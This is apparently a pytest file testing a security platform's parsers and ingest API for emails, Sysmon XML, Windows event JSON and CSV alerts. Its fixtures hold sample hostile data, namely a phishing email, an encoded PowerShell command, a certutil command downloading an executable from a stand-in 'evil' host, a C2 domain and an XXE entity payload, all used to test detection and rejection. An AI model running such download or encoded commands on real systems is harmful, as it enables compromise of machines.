"""Artifact parsers: .eml, Windows/Sysmon event XML+JSON, CSV; + file-ingest API."""
from __future__ import annotations

import base64

import pytest

from app.ingestion.parsers import ParseError, parse_artifact, supported_extensions

EML = b"""From: billing@evil.com
To: jdoe@acme.example, asmith@acme.example
Subject: Outstanding Invoice - Immediate Payment Required
Message-ID: <phish-eml-1@evil.com>
Content-Type: text/plain; charset="utf-8"

Please review the attached invoice and pay at https://evil.com/pay immediately.
"""

SYSMON_XML = """
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>1</EventID><Computer>WS-FIN-042</Computer></System>
  <EventData>
    <Data Name="Image">C:\\Windows\\System32\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -enc aQB3AHIA</Data>
    <Data Name="User">ACME\\jdoe</Data>
  </EventData>
</Event>
"""

WINEVENT_JSON = """
[{"System": {"EventID": 1, "Computer": "WS-FIN-042"},
  "EventData": {"CommandLine": "certutil -urlcache -f http://evil/p.exe",
                "User": "jdoe"}}]
"""

CSV = ("title,src_ip,user,host,description\n"
       "Suspicious login,45.155.205.99,jdoe,WS-FIN-042,brute force from bad ip\n"
       "Beacon,malware-c2.net,asmith,WS-2,c2 callout\n")


# ---------------------------------------------------------------- eml


def test_eml_parser_extracts_email_fields():
    alert = parse_artifact("report.eml", EML)
    assert "Outstanding Invoice" in alert.title
    assert alert.extra["message_id"] == "phish-eml-1@evil.com"
    assert "evil.com/pay" in alert.raw_text  # url survives into raw_text
    assert set(alert.users) == {"jdoe@acme.example", "asmith@acme.example"}
    assert alert.extra["sender"] == "billing@evil.com"


@pytest.mark.asyncio
async def test_eml_ingest_runs_full_investigation():
    from app.orchestrator import run_investigation

    alert = parse_artifact("report.eml", EML)
    pkg = await run_investigation("acme", alert)
    # evil.com is bundled known-bad -> malicious verdict from an uploaded email
    assert pkg.overall_verdict.value == "malicious"
    assert any(e.ioc.value == "evil.com" for e in pkg.iocs)


# ---------------------------------------------------------------- winevent


def test_sysmon_xml_extracts_commandline_and_host():
    alert = parse_artifact("sysmon.xml", SYSMON_XML.encode())
    assert "powershell.exe -enc" in alert.raw_text
    assert "WS-FIN-042" in alert.hosts
    assert alert.extra["event_ids"] == ["1"]


def test_winevent_json_extracts_fields():
    alert = parse_artifact("events.json", WINEVENT_JSON.encode())
    assert "certutil -urlcache" in alert.raw_text
    assert "WS-FIN-042" in alert.hosts


@pytest.mark.asyncio
async def test_sysmon_artifact_triggers_detection_rules():
    from tests.test_agents import make_investigator

    alert = parse_artifact("sysmon.xml", SYSMON_XML.encode())
    pkg = await make_investigator().investigate("acme", alert)
    fired = {d.rule_id for d in pkg.detections}
    assert "AEG-1001" in fired  # encoded PowerShell rule fires on the artifact


def test_evtx_binary_gives_actionable_error():
    with pytest.raises(ParseError, match="export to XML or JSON"):
        parse_artifact("Security.evtx", b"\x45\x6c\x66\x46")  # 'ElfF' evtx magic


def test_xml_with_dtd_entity_is_rejected():
    """XXE / billion-laughs guard: DTD/entity declarations are refused."""
    xxe = (b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x "boom">]>'
           b"<Event><System><EventID>1</EventID></System></Event>")
    with pytest.raises(ParseError, match="DTD/entity"):
        parse_artifact("evil.xml", xxe)


# ---------------------------------------------------------------- csv


def test_csv_parser_maps_columns_and_aggregates_rows():
    alert = parse_artifact("alerts.csv", CSV.encode())
    assert alert.title == "Suspicious login"
    assert "45.155.205.99" in alert.raw_text and "malware-c2.net" in alert.raw_text
    assert {"jdoe", "asmith"} <= set(alert.users)
    assert {"WS-FIN-042", "WS-2"} <= set(alert.hosts)


def test_txt_parser_is_freetext():
    alert = parse_artifact("notes.txt", b"seen beaconing to evil.com and 8.8.8.8")
    assert "evil.com" in alert.raw_text


def test_unsupported_extension_raises():
    with pytest.raises(ParseError, match="unsupported artifact type"):
        parse_artifact("capture.pcap", b"\x00")


def test_supported_extensions_listed():
    exts = supported_extensions()
    assert {"eml", "xml", "json", "csv", "txt"} <= set(exts)


# ---------------------------------------------------------------- API


def _headers(tenant: str = "acme") -> dict[str, str]:
    return {"X-Tenant-ID": tenant, "X-Roles": "tier3_analyst",
            "Authorization": "Bearer dev"}


def test_ingest_file_text_end_to_end(client):
    resp = client.post("/api/v1/alerts/ingest-file", headers=_headers(),
                       json={"filename": "sysmon.xml", "content": SYSMON_XML})
    assert resp.status_code == 201, resp.text
    body = resp.json()
    assert "AEG-1001" in {d["rule_id"] for d in body["detections"]}


def test_ingest_file_base64_binary(client):
    b64 = base64.b64encode(EML).decode()
    resp = client.post("/api/v1/alerts/ingest-file", headers=_headers(),
                       json={"filename": "phish.eml", "content_b64": b64})
    assert resp.status_code == 201
    assert resp.json()["overall_verdict"] == "malicious"


def test_ingest_file_async_returns_202(client):
    resp = client.post("/api/v1/alerts/ingest-file?mode=async", headers=_headers(),
                       json={"filename": "a.csv", "content": CSV})
    assert resp.status_code == 202
    assert resp.json()["status"] == "queued"


def test_ingest_file_bad_base64_is_422(client):
    resp = client.post("/api/v1/alerts/ingest-file", headers=_headers(),
                       json={"filename": "x.eml", "content_b64": "not!!base64"})
    assert resp.status_code == 422


def test_ingest_file_unsupported_type_is_422(client):
    resp = client.post("/api/v1/alerts/ingest-file", headers=_headers(),
                       json={"filename": "x.pcap", "content": "data"})
    assert resp.status_code == 422


def test_ingest_file_requires_permission(client):
    tier1 = {"X-Tenant-ID": "acme", "X-Roles": "tier1_analyst",
             "Authorization": "Bearer dev"}
    resp = client.post("/api/v1/alerts/ingest-file", headers=tier1,
                       json={"filename": "a.txt", "content": "hi"})
    assert resp.status_code == 403
